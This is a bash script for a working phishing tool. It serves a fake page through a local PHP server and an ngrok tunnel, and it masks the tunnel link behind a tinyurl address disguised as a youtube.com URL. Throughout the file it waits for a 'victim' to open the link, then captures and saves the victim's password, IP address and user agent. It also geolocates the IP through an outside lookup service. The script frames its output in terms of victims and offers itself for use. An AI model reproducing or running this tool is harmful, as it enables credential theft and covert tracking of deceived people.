#!/bin/bash

catch_cred() {
IFS=$'\n'
password=$(grep -o 'Pass:.*' data/password.txt | cut -d ":" -f2)
printf "\033[0m[\033[32m+\033[0m] \033[36mPassword\033[0m:\033[32m%s\n" $password
cat data/password.txt >> saved.password.txt
printf "\033[0m[\033[32m+\033[0m] \033[36msaved\033[0m: \033[32mpassword.txt\n"
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
exit 1
}

getcredentials() {
printf "\033[33m[\033[31m!\033[33m] \033[36mWaiting credentials...\n"
while [ true ]; do


if [[ -e "data/password.txt" ]]; then
printf "\033[0m[\033[32m+\033[0m] \033[36mCredentials Found!\n"
catch_cred

fi
sleep 1
done 


}
banner(){
python3 logo.py
}

catch_ip() {
touch data/saved.usernames.txt
ip=$(grep -a 'IP:' data/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' data/ip.txt | cut -d '"' -f2)
printf "\033[0m[\033[32m+\033[0m] \033[36mVictim IP\033[0m: \033[32m%s\n" $ip
printf "\033[0m[\033[32m+\033[0m] \033[36mUser-Agent\033[0m: \033[32m%s\n" $ua
printf "\033[0m[\033[32m+\033[0m] \033[36mSeved\033[0m: \033[32mdata/saved.ip.txt\n"
cat data/ip.txt >> data/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\033[0m[\033[32m+\033[0m] \033[36mHostname\033[0m: \033[32m%s\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\033[0m[\033[32m+\033[0m] \033[36mReverse DNS\033[0m: \033[32m%s\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\033[0m[\033[32m+\033[0m] \033[36mIP Continent\033[0m: \033[32m%s\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\033[0m[\033[32m+\033[0m] \033[36mIP Country\033[0m: \033[32m%s\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\033[0m[\033[32m+\033[0m] \033[36mState\033[0m: \033[32m%s \n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\033[0m[\033[32m+\033[0m] \033[36mCity Location\033[0m: \033[32m%s\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\033[0m[\033[32m+\033[0m] \033[36mISP\033[0m: \033[32m%s\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\033[0m[\033[32m+\033[0m] \033[36mAS Number\033[0m: \033[32m%s\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\033[0m[\033[32m+\033[0m] \033[36mIP Address Speed\033[0m: \033[32m%s\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\033[0m[\033[32m+\033[0m] \033[36mIP Currency\033[0m: \033[32m%s\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}
start() {
if [[ -e data/ip.txt ]]; then
rm -rf data/ip.txt

fi
if [[ -e data/password.txt ]]; then
rm -rf data/password.txt

fi


if [[ -e ngrok ]]; then
printf ""
else
echo -e "\033[33m [\033[31m!\033[33m] \033[0mrequired program not found: ngrok"
echo -e "\033[33m [\033[31m!\033[33m] \033[0mthis program is bundled with the ngrok suite:"
echo -e "\033[33m [\033[31m!\033[33m] \033[36mhttps://ngrok.com/"

echo -e ""
exit 1
fi


printf "\033[33m[\033[31m!\033[33m] \033[36mStarting php server...\n"
cd data && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\033[33m[\033[31m!\033[33m] \033[36mStarting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\033[0m[\033[32m+\033[0m] \033[36mSend this link\033[0m: \033[32m%s\n" $link
send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://youtube.com/c/$link" | head -n1)
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\033[0m[\033[32m+\033[0m] \033[36mOr using tinyurl\033[0m: \033[32m%s\n' $send_ip

checkfound
}

checkfound() {
printf "\33[33m[\033[31m!\033[33m] \033[36mWaiting victim open the link ...\n"
while [ true ]; do
if [[ -e "data/ip.txt" ]]; then
printf "\033[0m[\033[32m+\033[0m] \033[36mIP Found\n"
catch_ip
rm -rf data/ip.txt
fi
sleep 0.5
if [[ -e "data/password.txt" ]]; then
printf "\033[33m[\033[32m+\033[33m] \033[36mCredentials Found!\n"
catch_cred
rm -rf data/password.txt
fi
sleep 0.5
done
}
banner
start
